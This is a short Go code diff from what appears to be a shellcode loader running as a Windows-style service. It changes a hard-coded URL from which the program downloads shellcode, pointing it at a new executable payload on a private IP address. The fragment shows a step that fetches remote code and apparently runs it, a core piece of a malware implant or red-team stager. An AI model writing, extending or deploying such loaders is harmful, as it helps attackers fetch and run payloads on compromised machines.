@@ -990,7 +990,7 @@ func main() {
 
 	if isService {
 		// Run as service with proper event handling
-		url := "http://10.200.81.134/shellc.bin"
+		url := "http://10.200.88.158/http.x64.exe"
 		shellcode, err := downloadShellcode(url)
 		if err != nil {
 			panic(err)
